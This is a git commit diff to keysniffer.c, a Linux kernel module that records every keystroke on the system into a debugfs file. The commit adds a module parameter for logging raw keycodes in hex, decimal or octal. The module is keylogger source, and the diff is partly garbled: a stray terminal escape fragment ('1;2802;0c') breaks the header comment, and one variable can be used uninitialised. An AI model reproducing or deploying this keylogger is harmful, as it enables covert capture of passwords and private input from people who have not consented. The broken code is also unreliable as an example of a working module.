7c5664d27b0931b335452a481afbd8cb0548ef95
dvad924 <dvad924@gmail.com>
2017-03-26 11:54:57 -0400

    Show scancodes in debugfs (#4)
    * Changed US keys to keycode, also added shift mask
    
    * added the module param
    
    * Tweaked style to fit standard
    
    * Used removed all code formatting errors via checkpatch.pl
    
    * Add feature log raw keycodes
    
    Add a module parameter to set if the module
    will log the US Keyboard characters
    or the raw keycode values. In raw mode the
    shift mask is also added to beginning of each line.
    
    This is done by adding the integer flag "codes" as
    a module parameter. If the flag is 0 (default) the behavior
    is unchanged from the original version. Otherwise
    the shift mask and keycode are converted to their
    base 10 string representations and written to the
    "keys" log file in the format "mask_space_keycode".
    
    * Removed unecessary example
    
    * Add fun c -> str (still needs code format)
    
    Was on a different machine, will reformat when I have the check script

--- keysniffer.c
+++ keysniffer.c
@@ -1,5 +1,5 @@
 /*
- * A Linux kernel module to grab keycodes and log to debugfs
+1;2802;0c * A Linux kernel module to grab keycodes and log to debugfs
  *
  * Author: Arun Prakash Jana <engineerarun@gmail.com>
  * Copyright (C) 2015 by Arun Prakash Jana <engineerarun@gmail.com>
@@ -21,15 +21,30 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/moduleparam.h>
 #include <linux/keyboard.h>
 #include <linux/debugfs.h>
+#include <linux/input.h>
 
-#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
+#define BUF_LEN (PAGE_SIZE << 2)      /* 16KB buffer (assuming 4KB PAGE_SIZE) */
+
+#define MAX_ENC_LEN sizeof(int) * 8   /* Length of an encoded 'code shift' chunck */
+#define US  0                         /* Type code for US character log */
+#define HEX 1                         /* Type code for hexadecimal log */
+#define DEC 2                         /* Type code for decimal log */
+#define OCT 3                         /* Type code for octal log */
+#define UNI 4                         /* Type code for Unicode log */
+#define SHIFT 1                       /* shift_mask code for shift */
+
+static int codes;                     /* Log type module parameter */
 
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
 MODULE_VERSION("1.4");
 MODULE_DESCRIPTION("Sniff and log keys pressed in the system to debugfs");
+
+module_param(codes, int, 0644);
+MODULE_PARM_DESC(codes, "Flag: 0: US keyboard, 1: keycodes (base16) 2: (base10) 3: (base8)");
 
 /* Declarations */
 static struct dentry *file;
@@ -102,40 +117,69 @@ static struct notifier_block keysniffer_blk = {
 	.notifier_call = keysniffer_cb,
 };
 
+void keycode_to_string(int keycode, int shift_mask, char *buffer, int type)
+{
+  const char *pressed_key;
+  const char *format_type;
+  switch (type) {
+  case US:
+    if (keycode >= 0x1 && keycode <= 0x77) {
+      pressed_key = (shift_mask == 1)
+			? us_keymap[keycode][1]
+			: us_keymap[keycode][0];
+      
+      snprintf(buffer, MAX_ENC_LEN, "%s %x", pressed_key, shift_mask);
+    }
+    break;
+  case HEX:
+    format_type = "%x %x";
+    break;
+  case DEC:
+    format_type = "%d %d";
+    break;
+  case OCT:
+    format_type = "%o %o";
+    break;
+  case UNI:
+    format_type = "%x %x";
+  }
+  
+  
+  if (type != US && keycode < KEY_MAX) {
+    snprintf(buffer, MAX_ENC_LEN, format_type, keycode, shift_mask);
+  }
+}
+
 /* Keypress callback */
 int keysniffer_cb(struct notifier_block *nblock,
-		unsigned long code,
-		void *_param)
+		  unsigned long code,
+		  void *_param)
 {
 	size_t len;
+	char keybuf[MAX_ENC_LEN] = {0};
 	struct keyboard_notifier_param *param = _param;
-	const char *pressed_key;
 
 	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
-		code, param->down, param->shift, param->value);
+		 code, param->down, param->shift, param->value);
 
 	if (!(param->down))
 		return NOTIFY_OK;
 
-	if (param->value >= 0x1 && param->value <= 0x77) {
-		pressed_key = param->shift
-				? us_keymap[param->value][1]
-				: us_keymap[param->value][0];
-		if (pressed_key) {
-			len = strlen(pressed_key);
+        keycode_to_string(param->value, param->shift, keybuf, codes);
+        len = strlen(keybuf);
 
-			if ((buf_pos + len) >= BUF_LEN) {
-				memset(keys_buf, 0, BUF_LEN);
-				buf_pos = 0;
-			}
-
-			strncpy(keys_buf + buf_pos, pressed_key, len);
-			buf_pos += len;
-			keys_buf[buf_pos++] = '\n';
-
-			pr_debug("%s\n", pressed_key);
-		}
-	}
+        if (len < 1) 
+          return NOTIFY_OK;
+        
+        if ((buf_pos + len) >= BUF_LEN) {
+          memset(keys_buf, 0, BUF_LEN);
+          buf_pos = 0;
+        }
+	
+        strncpy(keys_buf + buf_pos, keybuf, len);
+        buf_pos += len;
+        keys_buf[buf_pos++] = '\n';
+        pr_debug("%s\n", keybuf);
 
 	return NOTIFY_OK;
 }
